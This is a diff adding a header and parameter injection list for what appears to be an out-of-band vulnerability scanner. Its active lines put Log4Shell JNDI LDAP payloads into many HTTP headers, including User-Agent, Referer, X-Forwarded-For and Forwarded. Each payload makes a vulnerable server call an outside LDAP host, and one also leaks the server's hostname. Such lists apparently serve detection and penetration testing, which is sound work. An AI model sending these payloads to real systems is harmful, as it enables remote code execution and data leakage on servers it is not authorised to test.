@@ -1,0 +1,45 @@
+# Lines starting with # are ignored
+#param,u,http://%s/
+#param,href,http://%s/
+#param,action,http://%s/
+#param,host,%s
+#param,http_host,%s
+#param,email,root@%s
+#param,url,http://%s/
+#param,load,http://%s/
+#param,preview,http://%s/
+#param,target,http://%s/
+#param,proxy,http://%s/
+#param,from,http://%s/
+#param,src,http://%s/
+#param,ref,http://%s/
+#param,referrer,http://%s/
+# %h is replaced with corresponding Host header
+# Useful in cases like Host, Origin, etc.
+#header,Host,%s:80@%h
+header,Contact,root@${jndi:ldap://%h.%s/a}
+header,From,root@${jndi:ldap://%h.%s/a}
+header,User-Agent,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 ${jndi:ldap://%h.%s/a}${jndi:ldap://${hostName}.%h.%s/a}
+header,Referer,http://${jndi:ldap://%h.%s/a}/ref
+#header,X-Original-URL,http://${jndi:ldap://%h.%s/a}/
+header,X-Wap-Profile,http://${jndi:ldap://%h.%s/a}/wap.xml
+#header,Profile,http://${jndi:ldap://%h.%s/a}/wap.xml
+#header,X-Arbitrary,http://${jndi:ldap://%h.%s/a}/
+#header,X-HTTP-DestinationURL,http://${jndi:ldap://%h.%s/a}/
+#header,X-Forwarded-Proto,http://${jndi:ldap://%h.%s/a}/
+#header,Origin,http://${jndi:ldap://%h.%s/a}
+#header,X-Forwarded-Host,${jndi:ldap://%h.%s/a}
+#header,X-Forwarded-Server,${jndi:ldap://%h.%s/a}
+#header,X-Host,${jndi:ldap://%h.%s/a}
+#header,Proxy-Host,${jndi:ldap://%h.%s/a}
+#header,Destination,${jndi:ldap://%h.%s/a}
+#header,Proxy,http://${jndi:ldap://%h.%s/a}
+#header,Via,1.1 ${jndi:ldap://%h.%s/a}
+header,X-Forwarded-For,${jndi:ldap://%h.%s/a}
+header,True-Client-IP,${jndi:ldap://%h.%s/a}
+header,Client-IP,${jndi:ldap://%h.%s/a}
+header,X-Client-IP,${jndi:ldap://%h.%s/a}
+header,X-Real-IP,${jndi:ldap://%h.%s/a}
+header,X-Originating-IP,${jndi:ldap://%h.%s/a}
+header,CF-Connecting_IP,${jndi:ldap://%h.%s/a}
+header,Forwarded,for=${jndi:ldap://%h.%s/a};by=${jndi:ldap://%h.%s/a};host=${jndi:ldap://%h.%s/a}
